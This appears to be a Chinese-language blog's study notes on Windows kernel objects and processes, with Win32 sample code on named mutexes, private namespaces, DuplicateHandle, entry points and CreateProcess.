如果同名且类型相同，系统会检查访问权限。如果允许访问该内核对象，则会更新主调进程的句柄表，并使对象的使用计数器递增。 如果bInHeritHandle参数传入TRUE，那么返回的句柄就是“可继承”的 Create如果不存在则创建， Open如果不存在则返回NULL。 为了避免两个互不相干的程序冲突建议使用GUID来创建具名内核对象。 一个利用具名内核对象来防止应用程序创建多个实例的例子。 12345678910111213141516171819#include &lt;windows.h&gt;#include &lt;stdio.h&gt;int main(int argc, char* argv[]){ //// {89AE97EA-F13D-4104-B042-43C010033B48} HANDLE h = CreateMutex(NULL, FALSE, TEXT(&quot;{89AE97EA-F13D-4104-B042-43C010033B48}&quot;)); if (GetLastError() == ERROR_ALREADY_EXISTS) { // there is already an instance of this application running. // close the object and immediately return. CloseHandle(h); return (0); } system(&quot;pause&quot;); CloseHandle(h); return 0;} 该程序只会运行一个实例。 终端服务命名空间终端服务程序（service）除了有一全局的命名空间，所有客户端能访问的内核对象要放在这个命名空间中。 每个客户端会话（Client session）都有自己的命名空间。对于两个会话正在运行同一个程序的时候，这样的安排可以避免彼此之间的干扰–一个会话不会访问另一个会话的对象，即使对象的名称相同。 因为系统服务默认启动与Session 0 ，而用户的应用会在一个新的Session中启动。如果和系统服务间的通信不在一个命名空间中就会可能出问题。 可以通过ProcessIdToSessonId函数知道我们的应用程序在哪个Terminal Services会话中运行。 123456789101112131415161718192021#include &lt;stdio.h&gt;#include &lt;windows.h&gt;int main(int argc, char* argv[]){ DWORD processID = GetCurrentProcessId(); DWORD sessionID; if (ProcessIdToSessionId(processID, &amp;sessionID)){ printf(&quot;Process '%u' runs in Terminal Services session '%u'\\n&quot;, processID, sessionID); } else{ // ProcessIdToSessionId might fail if you don't have enough rights // to access the process for which you pass the ID as parameter. // Notice that it is not the case here because we're using our own process ID. printf(&quot;Unable to get Terminal Services session ID for process '%u'\\n&quot;, processID); } system(&quot;pause&quot;); return 0;} 一个服务（system service）的命名内核对象始终位于全局命名空间。默认情况下应用程序的命名内核对象在会话的命名空间内。 可以强制把命名对象放入全局命名空间”Global&quot; HANDLE h = CreateEvent(NULL, FALSE, FALSE, TEXT(“Global\\MyName”)); 也可以显式把内核对象放入当前会话的命名空间 加上”Local&quot;前缀 HANDLE h = CreateEvent(NULL, FALSE, FALSE, TEXT(“Local\\MyName”)); Global 和 Local是命名对象的保留字。除非强制一个特定的命名空间，否则不应在对象名中使用。 Session也是保留字，但是不能在当前Session中创建创建另外一个Session前缀的对象。GetLastError返回ERROR_ACCESS_DENIED (保留关键字都是区分大小写的) 专有命名空间如果想确保我们的应用程序创建的内核对象名称永远不会和其他应用程序的名称冲突，或者想保护他们免遭劫持，可以定义一个自定义的前缀，并把他作为自己的专有命名空间使用，这和使用Global和Local前缀是相似的。 一个单例进程的例子，以一种更安全的方式来实现前面的例子 研究以下问题 1）如何创建一个边界 2）如何将对应于本地管理组（Local Administrators）的安全描述符（Security identifier， SID）和边界关联 3）如何创建或打开其名称被用作互斥量内核对象前缀的一个专有命名空间。 边界描述符会获得一个名称， 而且还会与一个特权用户组的SID相关联。 Windows就可以确保在用户隶属于这个权限时（SID），以其身份创建的应用程序才能在此SID对应的边界条件中创建相同的命名空间，从而访问在这个边界中创建的，以专有命名空间的名称作为前缀的内核对象。 如果由于SID泄漏，一个低权限的而已程序试图创建相同的边界描述符，那么当其试图创建或打开一个高权限账户保护的专有命名空间时，调用就会失败GetLastError返回 ERROR_ACCESS_DENIED. 原始代码 Singleton.cpp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227/* Module: Singleton.cpp Notices: Copyright (c) 2008 Jeffrey Richter &amp; Christophe Nasarre*/ #include &quot;resource.h&quot; #include &quot;..\\CommonFiles\\CmnHdr.h&quot; // common header for Windows Via C++ sample#include &lt;windowsx.h&gt;#include &lt;Sddl.h&gt; // for SID management#include &lt;tchar.h&gt;#include &lt;strsafe.h&gt; /////////////////////////////////////////////////////////////////////////////// // Main dialogHWND g_hDlg; // Mutex, boundary and namespace used to detect previous running instanceHANDLE g_hSingleton = NULL;HANDLE g_hBoundary = NULL;HANDLE g_hNamespace = NULL; // Keep track whether or not the namespace wa created or open for clean-upBOOL g_bNamespaceOpened = FALSE; // Names of boundary and private namespacePCTSTR g_szBoundary = TEXT(&quot;3-Boundary&quot;);PCTSTR g_szNamespace = TEXT(&quot;3-Namespace&quot;); #define DETAILS_CTRL GetDlgItem(g_hDlg, IDC_EDIT_DETAILS) /////////////////////////////////////////////////////////////////////////////// // Adds a string to the &quot;Details&quot; edit controlvoid AddText(PCTSTR pszFormat, ...) { va_list argList; va_start(argList, pszFormat); TCHAR sz[20 * 1024] ; Edit_GetText(DETAILS_CTRL, sz, _countof(sz)); _vstprintf_s( _tcschr(sz, TEXT('\\0')), _countof(sz) - _tcslen(sz), pszFormat, argList); Edit_SetText(DETAILS_CTRL, sz); va_end(argList);} /////////////////////////////////////////////////////////////////////////////// void Dlg_OnCommand(HWND hwnd, int id, HWND hwndCtl, UINT codeNotify) { switch (id) { case IDOK: case IDCANCEL: // User has clicked on the exit button // Or dismissed the dialog with ESCAPE EndDialog(hwnd, id); break; }} /////////////////////////////////////////////////////////////////////////////// void CheckInstances() { // Create the boundary descriptor g_hBoundary = CreateBoundaryDescriptor(g_szBoundary, 0); // Create a SID corresponding to the Local Administrator group BYTE localAdminSID[SECURITY_MAX_SID_SIZE]; PSID pLocalAdminSID = &amp;localAdminSID; DWORD cbSID = sizeof(localAdminSID); if (!CreateWellKnownSid( WinBuiltinAdministratorsSid, NULL, pLocalAdminSID, &amp;cbSID) ) { AddText(TEXT(&quot;AddSIDToBoundaryDescriptor failed: %u\\r\\n&quot;), GetLastError()); return; } // Associate the Local Admin SID to the boundary descriptor // --&gt; only applications running under an administrator user // will be able to access the kernel objects in the same namespace if (!AddSIDToBoundaryDescriptor(&amp;g_hBoundary, pLocalAdminSID)) { AddText(TEXT(&quot;AddSIDToBoundaryDescriptor failed: %u\\r\\n&quot;), GetLastError()); return; } // Create the namespace for Local Administrators only SECURITY_ATTRIBUTES sa; sa.nLength = sizeof(sa); sa.bInheritHandle = FALSE; if (!ConvertStringSecurityDescriptorToSecurityDescriptor( TEXT(&quot;D:(A;;GA;;;BA)&quot;), SDDL_REVISION_1, &amp;sa.lpSecurityDescriptor, NULL)) { AddText(TEXT(&quot;Security Descriptor creation failed: %u\\r\\n&quot;), GetLastError()); return; } g_hNamespace = CreatePrivateNamespace(&amp;sa, g_hBoundary, g_szNamespace); // Don't forget to release memory for the security descriptor LocalFree(sa.lpSecurityDescriptor); // Check the private namespace creation result DWORD dwLastError = GetLastError(); if (g_hNamespace == NULL) { // Nothing to do if access is denied // --&gt; this code must run under a Local Administrator acount if (dwLastError == ERROR_ACCESS_DENIED) { AddText(TEXT(&quot;Access denied when create the namespace.\\r\\n&quot;)); AddText(TEXT(&quot; You must be running as Administrator.\\r\\n\\r\\n&quot;)); return; } else { if (dwLastError == ERROR_ALREADY_EXISTS) { // if another instance has already created the namespace, // we need to open it instead. AddText(TEXT(&quot;CreatePrivateNamespace failed: %u\\r\\n&quot;), dwLastError); g_hNamespace = OpenPrivateNamespace(g_hBoundary, g_szNamespace); if (g_hNamespace == NULL) { AddText(TEXT(&quot; and OpenPrivateNamespace failed: %u\\r\\n&quot;), dwLastError); return; } else { g_bNamespaceOpened = TRUE; AddText(TEXT(&quot; but OpenPrivateNamespace succeeded\\r\\n\\r\\n&quot;)); } } else { AddText(TEXT(&quot;Unexpected error occured: %u\\r\\n\\r\\n&quot;), dwLastError); return; } } } // Try to create the mutex object with a name // based on the private namespace TCHAR szMutexName[64]; StringCchPrintf(szMutexName, _countof(szMutexName), TEXT(&quot;%s\\\\%s&quot;), g_szNamespace, TEXT(&quot;Singleton&quot;)); g_hSingleton = CreateMutex(NULL, FALSE, szMutexName); if (GetLastError() == ERROR_ALREADY_EXISTS) { // There is already an instance of this Singleton object AddText(TEXT(&quot;Another instance of Singleton is running:\\r\\n&quot;)); AddText(TEXT(&quot;--&gt; Impossible to access application features.\\r\\n&quot;)); } else { // First time the Singleton object is created AddText(TEXT(&quot;First instance of Singleton:\\r\\n&quot;)); AddText(TEXT(&quot;--&gt; Access application features now.\\r\\n&quot;)); }} /////////////////////////////////////////////////////////////////////////////// BOOL Dlg_OnInitDialog(HWND hwnd, HWND hwndFocus, LPARAM lParam) { chSETDLGICONS(hwnd, IDI_SINGLETON); // Keep track of the main dialog window handle g_hDlg = hwnd; // Check whether another instance is already running CheckInstances(); return TRUE;} /////////////////////////////////////////////////////////////////////////////// INT_PTR WINAPI Dlg_Proc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) { switch (uMsg) { chHANDLE_DLGMSG(hwnd, WM_COMMAND, Dlg_OnCommand); chHANDLE_DLGMSG(hwnd, WM_INITDIALOG, Dlg_OnInitDialog); } return FALSE;} /////////////////////////////////////////////////////////////////////////////// int APIENTRY _tWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdLine, int nCmdShow){ UNREFERENCED_PARAMETER(hPrevInstance); UNREFERENCED_PARAMETER(lpCmdLine); // Show main window DialogBox(hInstance, MAKEINTRESOURCE(IDD_SINGLETON), NULL, Dlg_Proc); // Don't forget to clean up and release kernel resource if (g_hSingleton != NULL) { CloseHandle(g_hSingleton); } if (g_hNamespace != NULL) { if (g_bNamespaceOpened) { // Open namespace ClosePrivateNamespace(g_hNamespace, 0); } else { ClosePrivateNamespace(g_hNamespace, PRIVATE_NAMESPACE_FLAG_DESTROY); } } if (g_hBoundary != NULL) { DeleteBoundaryDescriptor(g_hBoundary); } return 0;} CheckInstances函数的几个步骤。 创建边界描述符 123// Create the boundary descriptorg_hBoundary = CreateBoundaryDescriptor(g_szBoundary, 0); 注意该函数的返回类型虽然是HANDLE，但是并非是一个内核对象的句柄。而是一个指针，指向了用户模式的结构，结构体中保护了边界的定义。 应该调用DeleteBoundaryDescriptor释放 （CloseHandle会失败） 将一个特权用户组的SID与边界描述符关联起来： 123456789// Associate the Local Admin SID to the boundary descriptor// --&gt; only applications running under an administrator user// will be able to access the kernel objects in the same namespaceif (!AddSIDToBoundaryDescriptor(&amp;g_hBoundary, pLocalAdminSID)) { AddText(TEXT(&quot;AddSIDToBoundaryDescriptor failed: %u\\r\\n&quot;), GetLastError()); return;} 在本例中创建了基于Local Administrator组的SID，并使用CreateWellKnownSid创建SID的描述符 创建专有命名空间 123456789101112131415// Create the namespace for Local Administrators onlySECURITY_ATTRIBUTES sa;sa.nLength = sizeof(sa);sa.bInheritHandle = FALSE;if (!ConvertStringSecurityDescriptorToSecurityDescriptor( TEXT(&quot;D:(A;;GA;;;BA)&quot;), SDDL_REVISION_1, &amp;sa.lpSecurityDescriptor, NULL)) { AddText(TEXT(&quot;Security Descriptor creation failed: %u\\r\\n&quot;), GetLastError()); return;}g_hNamespace = CreatePrivateNamespace(&amp;sa, g_hBoundary, g_szNamespace); 边界描述符添加的SID决定了谁能进入边界并创建命名空间。是通过ConvertStringSecurityDescriptorToSecurityDescriptor创建的 关于安全描述符的语法接口参考MSDN (https://msdn.microsoft.com/en-us/library/aa374928.aspx) 如果试图创建一个已有的命名空间，CreatePrivateNamespace将返回NULL, GetLastError将返回ERROR_ALREADY_EXISTS 此时调用OpenPrivateNamespace来打开命名空间 12g_hNamespace = OpenPrivateNamespace(g_hBoundary, g_szNamespace); 注意CreatePrivateNamespace和 OpenPrivateNamespace返回的伪HANDLE并非内核句柄， 调用ClosePrivateNamespace来关闭伪句柄。 进程终止前调用 DeleteBoundaryDescriptor 关闭边界 复制对象句柄跨进程共享内核对象的最后一招是使用DuplicateHandle函数 12345678910111213WINBASEAPIBOOLWINAPIDuplicateHandle( _In_ HANDLE hSourceProcessHandle, _In_ HANDLE hSourceHandle, _In_ HANDLE hTargetProcessHandle, _Outptr_ LPHANDLE lpTargetHandle, _In_ DWORD dwDesiredAccess, _In_ BOOL bInheritHandle, _In_ DWORD dwOptions ); 获得一个进程句柄表中的记录项，在另一个进程的句柄表中创建这个记录项的一个副本。 参数1 和3 是进程内核对象的句柄。并且这两个句柄必须相对于调用DuplicateHandle函数的进程（hSourceProcessHandle 也可以调用DuplicateHandle）。 如果传递非进程句柄则会失败。 第二个参数是指向任何类型的内核对象的句柄。但是他的值一定不能和调用DuplicateHandle函数的那个进程相关。 必须和hSourceProcessHandle的这个进程有关。 函数最终会将源进程中的句柄信息复制到hTargetProcessHandle所表示的进程的句柄表中。 第四个参数是一个HANDLE指针，用于传递复制以后获得的句柄值。 后3个参数指定这个内核对象在目标进程中所对应的句柄表项，应该使用何种访问掩码和继承标志。 dwOptions可以为0 或者 DUPLICATE_SAME_ACCESS(保留同样的掩码) 和 DUPLICATE_CLOSE_SOURCE（关闭源进程中的句柄） 使用DuplicateHandle函数和继承有一个问题，目标进程不知道他现在能访问一个新的内核对象。必须通过某种进程间通信来通知目标进程。 一个DuplicateHandle的例子 两个进程互相拷贝: 12345678910111213141516171819202122// All of the following code is excuted by process S.// Create a mutex object accessible by Process S.HANDLE hObjInProcessS = CreateMutex(NULL, FALSE, NULL);// Get a handle to Process T's kernel object.HANDLE hProcessT = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessIdT);HANDLE hObjInProcessT; // An uninitialized handle relative to Process T.// Give Process T access to our mutex object.DuplicateHandle(GetCurrentProcess(), hObjInProcessS, hProcessT, &amp;hObjInProcessT, 0, FALSE, DUPLICATE_SAME_ACCESS);// Use some IPC mechanism to get the handle value of hObjInProcessS into Process T.// We no longer need to commicate with Process T.CloseHandle(hProcessT);// When Process S no longer needs to use the mutex, it should close it.CloseHandle(hObjInProcessS); 在本例中DuplicateHandle返回的句柄相对于进程T，因此绝对不要在进程S中释放此句柄 例如 CloseHandle(hObjInProcessT); 另一个例子在同一个进程中执行DuplicateHandle拷贝一个副本内核对象。注意创建和释放的周期 1234567891011121314151617181920212223// Create a file-mapping object; the handle has read/write access.HANDLE hFileMapRW = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_READWRITE, 0, 10240, NULL);// Create another handle to the file-mapping object;// the handle has read-only access.HANDLE hFileMapRO; //uninitialized.DuplicateHandle(GetCurrentProcess(), hFileMapRW, GetCurrentProcess(), &amp;hFileMapRO, FILE_MAP_READ, FALSE, 0);// call the function that should only read from the file mapping.ReadFromTheFileMapping(hFileMapRO);// Close the read-only file-mapping object.CloseHandle(hFileMapRO);// We can still read/write the file-mapping object using hFileMapRW.// ...// When the main code doesn't access the file mapping anymore,// Close it.CloseHandle(hFileMapRW);","link":"/2019/08/24/Windows-Kernel-3/"},{"title":"Windows-Kernel-4","text":"进程 进程通常被定义为一个正在运行的程序实例，它由两部分组成 一个是操作系统用来管理进程的内核对象。内核对象也是系统用来存放关于进程的统计信息的地方 另一个是地址空间，它包含所有可执行模块或DLL模块的代码和数据。它还包含动态内存分配的空间 进程是拥有“惰性”的。若要使进程完成某项操作，它必须拥有一个在它环境中运行的线程，该线程负责执行包含在进行的地址空间中的代码。 实际上，单个进程可能包含若干个线程，所有这些线程“同时”执行进程地址空间中的代码。为此，每个线程都有它自己的一组CPU寄存器和自己的堆栈 每个进程至少拥有一个线程，来执行进程的地址空间中的代码 如果没有线程要继续执行的代码，进程就失去了存在的理由。系统回自动销毁进程和其地址空间。 若要使得这些线程都能运行，操作系统就要为每个线程安排一定的CPU时间。它是以一种循环的方式对线程提供时间片(简称量程)，造成一种假象，彷佛所有的线程都是同时运行的 如果计算机装载多cpu或者（多核cpu），操作系统会采用更复杂的算法为线程分配cpu时间。 以上图片为在单CPU的计算机上，操作系统以轮询方式为每个单独的线程分配时间量 编程第一个Windows应用程序Windows支持两种类型的应用程序： 基于图形用户界面(GUI)的应用程序 基于控制台用户(CUI)的应用程序 用于 C U I应用程序的链接程序开关是 / S U B S Y S T E M : C O N D O L E，而用于 G U I应用程序的链接程序开关是S U B S Y S T E M : W I N D O W S。当用户运行一个应用程序时，操作系统的加载程序就会查看可执行图形程序的标题，并抓取该子系统的值。如果该值指明一个 C U I应用程序，那么加载程序就会自动保证为该应用程序创建文本控制台窗口。 用户运行应用程序时，操作系统加载程序（loader）会检查可执行文件映像的文件头，并获取这个子系统值。然后进行相应的加载（开启一个命令行窗口或者是创建一个主窗口） 等程序加载以后，操作系统就不会关心当前运行的是CUI和GUI了 Windows应用程序的入口函数： 1234567891011INT WINAPI _tWinMain( _In_ HINSTANCE hInstance, //窗口句柄 _In_opt_ HINSTANCE hPrevInstance, //实例句柄 _In_ LPSTR lpCmdLine, _In_ int nShowCmd); //显示方式 int _tmain( _In_ int _Argc, _In_reads_(_Argc) _Pre_z_ wchar_t ** _Argv, _In_z_ wchar_t ** _Env); 操作系统本身并不会调用入口函数main或是WinMain，而是调用C/C++运行实现的函数库，并在链接时使用-ENTRY：命令选项来设置的一个C/C++运行时的启动函数 该函数初始化C/C++运行库，使我们可以调用malloc free之类的函数。 还确保在代码执行前任何全局和静态的C++对象都被正确构造。 连接器选择正确的C/C++运行库启动函数。如果指定SUBSYSTEM：WINDOWS 连接器就会寻找WinMain 如果没有找到WinMain则返回“unresolved external symbol” 如果选择/SUBSYSTEM:CONSOLE 连接器默认会寻找main或者wmain 如果找不到则返回”unresolved external symbol” 可以自行关闭SUBSYSTEM连接器开关，让连接器自动判断（入口是main 还是winmain）。 当创建应用程序时，编程员会看到一个链接程序错误消息，因为 w i n 3 2应用程序项目设置了/ S U B S Y S T E M : W I N D O W S链接程序开关，但是不存在Wi n M a i n或w Wi n M a i n函数。这时，编程员可以有4个选择： 将m a i n函数改为Wi n M a i n。通常这不是最佳的选择，因为编程员可能想要创建一个控制台应用程序。 用Visual C++创建一个新的Win32 控制台应用程序，并将现有的源代码添加给新应用程序项目。这个选项冗长而乏味，因为它好像是从头开始创建应用程序，而且必须删除原始的应用程序文件。 单击Project Settings对话框的 L i n k选项卡，将 / S U B S Y S T E M : W I N D O W S开关改为/ S U B S Y S T E M : C O N S O L E。这是解决问题的一种比较容易的方法，很少有人知道他们只需要进行这项操作就行了。 单击Project Settings对话框的L i n k选项卡，然后全部删除/ S U B S Y S T E M : W I N D O W S开关。这是我喜欢选择的方法，因为它提供了最大的灵活性。现在，连接程序将根据源代码中实现的函数进行正确的操作。当用Visual C++的Developer Studio创建新Wi n 3 2应用程序或Wi n 3 2控制台应用程序项目时，我不知道为什么这没有成为默认设置。 Visual C++配有C运行期库的源代码。可以在CR t0.c文件中找到这4个启动函数的代码: 检索指向新进程的完整命令行的指针。 检索指向新进程的环境变量的指针 对C/C++运行期的全局变量进行初始化。如果包含了这个StdLib.h文件，代码就能访问这些变量。 对C运行期内存单元分配函数（malloc和calloc）和其他低层输入/输出例程使用的内存栈进行初始化。 为所有全局和静态C++类对象调用构造函数。 完成以上所有初始化以后，C/C++启动函数就会调用应用程序的入口函数。 如果我们定义了Unicode C/C++标准库将执行以下代码 12345STARTUPINFO StartupInfo; GetStartupInfo(&amp;StartupInfo); int nMainRetVal = wWinMain((HINSTANCE)&amp;__ImageBase, NULL, pszCommandLineUnicode, (STARTUPINFO.dwFlags &amp; STARTF_USESHOWWINDOW) ? STARTUPINFO.wShowWindow : SW_SHOWDEFAULT); 如果我们没有定义Unicode C/C++标准库将执行以下代码 123456STARTUPINFO StartupInfo;GetStartupInfo(&amp;StartupInfo);int nMainRetVal = WinMain((HINSTANCE)&amp;__ImageBase, NULL, pszCommandLineAnsi, (STARTUPINFO.dwFlags &amp; STARTF_USESHOWWINDOW) ? STARTUPINFO.wShowWindow : SW_SHOWDEFAULT); 如果编写了一个w m a i n函数，它将以下面的形式被调用： 1int nMainRetVal = wmain(__agrc,__wargv,_webviron); 如果编写了一个m a i n函数，它将以下面的形式被调用： 1int nMainRetVal = main(__argc,__argv,_environ); 当进入点函数返回时，启动函数便调用 C运行期的e x i t函数，将返回值（n M a i n R e t Va l）传递给它。E x i t函数负责下面的操作： 调用由_onexit函数的调用而注册的任何函数 为所有全局和静态的C++类对象调用析构函数 调用操作系统的ExitProcess函数，将nMainRetVal传递给它。 进程的实例句柄加载到进程地址空间的每个可执行文件或DLL文件均被赋予一个独一无二的实例句柄。可执行文件的实例作为(w)WinMain的第一个参数hinstExe来传递。对于加载资源的函数调用来说，通常都需要该剧并的值： 123456WINUSERAPIHICONHICON LoadIcon{ HINSTANCE hinst, //指明哪个文件(可执行文件或DLL)包含逆向加载的资源 PCTSTR pszIcon //}; 有的函数需要一个HMODULE类型的参数和HINSTANCE一致 12345678910WINBASEAPI_Success_(return != 0)_Ret_range_(1, nSize)DWORDWINAPIGetModuleFileNameW( _In_opt_ HMODULE hModule, _Out_writes_to_(nSize, ((return &lt; nSize) ? (return + 1) : nSize)) LPWSTR lpFilename, _In_ DWORD nSize ); WinMain的HinstExe参数实际的值是系统将可执行文件的映象到进程的地址空间时使用的基本地址空间。 如果系统打开了可执行文件并且将它的内容加载到地址0x00400000中，那么WinMain的hinstExe参数的值就说0x00400000。 可执行程序的映像加载到的基地址是由链接程序决定的。不同的链接程序可以使用不同的默认基地址。 VC++链接程序使用的默认基地址是0x00400000，因为这是在运行Windows98时可执行文件的映象可以加载到的最低地址。修改方法在微软的链接程序中的/BASE:address链接程序开关。 如果你想在Windows上加载的可执行文件的基地址小于0x00400000，那么Windows98加载程序必须将可执行文件重新加载到另一个地址。 下面的G e t M o d u l e H a n d l e函数返回可执行文件或D L L文件加载到进程的地址空间时所用的句柄/基地址： 1HMODULE GetModuleHandle(PCTSTR pszMoudle); 可以传入NULL 就会获得主调进程可执行文件的地址。 123456789101112131415161718#include &lt;stdio.h&gt;#include &lt;windows.h&gt;WINBASEAPI_When_(lpModuleName == NULL, _Ret_notnull_)_When_(lpModuleName != NULL, _Ret_maybenull_)HMODULEWINAPIGetModuleHandleW(_In_opt_ LPCWSTR lpModuleName);int main(){ HANDLE hInstExe = GetModuleHandle(NULL); return 0;} 进程的前一个实例句柄C / C + +运行期启动代码总是将N U L L传递给( w ) WinMain的hinstExePrev参数。该参数用在1 6位Window s中，并且保留了WinMain的一个参数，目的仅仅是为了能够容易地转用1 6位Windows应用程序。 hPrevInstance 参数用于16位windows系统，在32位系统中不要使用此参数。 可以不在参数列表中写参数变量，也可以通过宏 UNREFERENCED_PARAMETER(hPrevInstance); 来让编译器不发出警告 进程的命令行当一个新的进程创建时，它需要传递一个命令行。该命令行几乎永远不是空的，至少创建新进程的可执行文件的名字是命令行上的第一个标记。 当C运行期的启动代码开始运行的时候，它需要检索进程的命令行，跳过可执行文件的名字，并且指向命令行其余部分的指针传递给WinMain的pszCmdLine参数 pszCmdLine参数总是指向一个ANSI字符串。但是如果将WinMain改为wWinMain，就能够访问进程的Unicode版本命令行 也可以获得一个指向进程的完整命令行的指针，方法是调用GetCommandLine函数： 12PTSTR GetCommandLine(); 该函数返回一个指向包含完整命令行的缓存的指针，该命令行包括执行文件的完整路径名。 许多应用程序常常拥有转换成它的各个标记的命令行。使用全局性 _ _ a rg c（或_ _ w a rg v）变量，应用程序就能访问命令行的各个组成部分。下面这个函数 C o m m a n d L i n e To A rg v W将U n i c o d e字符串分割成它的各个标记： 12SHSTDAPI_(LPWSTR *) CommandLineToArgvW(_In_ LPCWSTR lpCmdLine, _Out_ int* pNumArgs); CommaneLineToArgvW负责在内部分配内存。大多数应用程序不释放该内存，它们在进程运行终止时依靠操作系统来释放内存。 例子： 123456789101112#include &lt;stdio.h&gt;#include &lt;windows.h&gt;SHSTDAPI_(LPWSTR *) CommandLineToArgvW(_In_ LPCWSTR lpCmdLine, _Out_ int* pNumArgs);int main(int argc, char* argv[], char * env[]){ int nNumArgs; PWSTR *ppArgv = CommandLineToArgvW(GetCommandLineW(), &amp;nNumArgs); HeapFree(GetProcessHeap(), 0, ppArgv); return 0;} 进程的环境变量每个进程都有一个与它相关的环境快。环境快是进程的地址空间中分配的一个内存块。每个环境块都包含一组字符串 每个字符串的第一部分是环境变量的名字，后跟一个等号，等号后面是要赋予变量的值。环境块中的所有字符串都必须按环境变量名的字母顺序进行排序。 通常，子进程可以继承一组与父进程相同的环境变量。但是，父进程能够控制子进程继承什么环境变量。 所谓继承，指的是子进程获得它自己的父进程的环境块拷贝，子进程与父进程并不共享相同的环境块。这意味着子进程能够添加、删除或修改它的环境块中的变量，而这个变化在父进程的环境块中却得不到反映。 线程的亲缘性一般来说，进程中的线程可以在主计算机中的任何一个 CPU上执行。但是一个进程的线程可能被强制在可用C P U的子集上运行。 进程的错误模式每个进程相关联的是一组标志，用于告诉系统，进程对严重的错误应该做出如何反映，包括磁盘介质错误，未处理的异常，文件查找错误以及数据对齐错误。 方法是调用SetErrorMode函数： 12UINT SetErrorMode(UINT fuErrorMode); fuErroMode参数是表4 - 3的任何标志按位用OR连接在一起的组合。 错误模式会被子进程继承，除非在CreatePcocess中设置CREATE_DEFAULT_ERROR_MODE 进程当前的驱动器和目录当不提供全路径名时，Wi n d o w s的各个函数就会在当前驱动器的当前目录中查找文件和目录。 系统将在内部保持对进程的当前驱动器和目录的追踪。由于该信息是按每个进程来维护的，因此改变当前驱动器或目录的进程中的线程，就可以为该进程中的所有线程改变这些信息。 12345678910111213141516WINBASEAPI_Success_(return != 0 &amp;&amp; return &lt; nBufferLength)DWORDWINAPIGetCurrentDirectoryW( _In_ DWORD nBufferLength, _Out_writes_to_opt_(nBufferLength, return + 1) LPWSTR lpBuffer ); WINBASEAPIBOOLWINAPISetCurrentDirectoryW( _In_ LPCWSTR lpPathName ); 如果进程中的某一线程调用了SetCurrentDirectory修改了默认的进程目录，则所有使用相对路径处理的可能会导致意外的错误。GetCurrentDirectory可以传入 （0， NULL） 会返回需要字符的个数包括末尾的’\\0’ 或者直接传入MAX_PATH 尺寸的buffer 进程中的当前目录系统将对进程的当前驱动器和目录保持跟踪，但是它不跟踪每个驱动器的当前目录。系统跟着记录这进程的当前驱动器和目录，但没有记录每个驱动器的当前目录。可以通过环境变量来支持 例如假定当前进程的目录是C:\\Utility\\Bin ,而我们调用CreateFile来打开D:ReadMe.Txt 那么系统会查找环境变量=D: 由于=D:是存在的，系统将尝试从D:\\Program Files目录打开ReadMe.txt文件，如果=D:不存在，系统会尝试从D盘根目录打开ReadMe.txt文件 Windows的文件函数从来不会添加或更改驱动器号。他们只是读取这种变量。 _chdir也可以更改当前目录其内部调用SetCurrentDirectory, _chdir还会调用SetEnvironmentVariable来添加或修改环境变量，从而使不同驱动器的当前目录得以保留。 如果父进程创建了一个它想传递给子进程的环境块，子进程的环境块不会自动继承父进程的当前目录。相反，子进程的当前目录将默认为每个驱动器的根目录。如果想要让子进程继承父进程的当前目录，该父进程必须创建这些驱动器名的环境变量。 获取每个驱动器的当前目录: 1234TCHAR szCurDir[MAX_PATH] = { 0 };DWORD cchLength = GetFullPathName(TEXT(&quot;D:&quot;), MAX_PATH, szCurDir, NULL);_tprintf(TEXT(&quot;%s\\n&quot;), szCurDir); 驱动器号环境变量通常必须放在环境块的开始处。 以下例子修改D盘的当前目录并调用GetFullPathName获取 12345SetCurrentDirectory(TEXT(&quot;D:\\\\Program Files (x86)&quot;));TCHAR szCurDir[MAX_PATH] = { 0 };DWORD cchLength = GetFullPathName(TEXT(&quot;d:&quot;), MAX_PATH, szCurDir, NULL);_tprintf(TEXT(&quot;%s\\n&quot;), szCurDir); 如果希望子进程继承父进程的当前目录，父进程就必须在生成子进程之前，创建这些驱动器号的环境变量，并把它添加到环境块中。 GetCurrentDirectory SetCurrentDirectory GetFullPathName 在多线程应用中应该特别小心，因为他们的值是进程相关的。在获取过程中可能被其他线程所修改了。而且也应该避免使用相对路径 系统版本应用程序常常需要确定用户运行的是哪个 Windows版本。 Windows API拥有下面的GetVersion函数： 12DWORD GetVersion(); ////主版本号在低字节，次版本号在高字节 1234567891011121314typedef struct _OSVERSIONINFOEXW { DWORD dwOSVersionInfoSize; DWORD dwMajorVersion; DWORD dwMinorVersion; DWORD dwBuildNumber; DWORD dwPlatformId; WCHAR szCSDVersion[ 128 ]; // Maintenance string for PSS usage WORD wServicePackMajor; WORD wServicePackMinor; WORD wSuiteMask; BYTE wProductType; BYTE wReserved;} OSVERSIONINFOEXW, *POSVERSIONINFOEXW, *LPOSVERSIONINFOEXW, RTL_OSVERSIONINFOEXW, *PRTL_OSVERSIONINFOEXW; CreatProcess函数CreatProcess函数： 1234567891011121314BOOL CreateProcess(LPCTSTR lpApplicationName,LPTSTR lpCommandLine,LPSECURITY_ATTRIBUTES lpProcessAttributes,LPSECURITY_ATTRIBUTES lpThreadAttributes,BOOL bInheritHandles,DWORD dwCreationFlags,LPVOID lpEnvironment,LPCTSTR lpCurrentDirectory,LPSTARTUPINFO lpStartupInfo,LPPROCESS_INFORMATION lpProcessInformation); 系统将创建一个进程内核对象，其初始引用计数器为1，进程内核对象并不是进程本身，而是操作系统用来管理该进程用的一个小型数据结构 系统为进程创建一个虚拟地址空间，并将可执行文件（DLL）的代码以及数据加载到进程的地址空间 系统为新进程的主线程创建一个线程内核对象（其引用计数为1）。与进程内核对象一样，线程内核对象也是操作系统用来管理线程的小型数据结构。通过C/C++运行期启动代码，该主线程便开始运行，它最终调用WinMain、wWinMain、main、或者wmain函数。如果系统成功创建了新线程和主线程，CreateProcess便返回TRUE 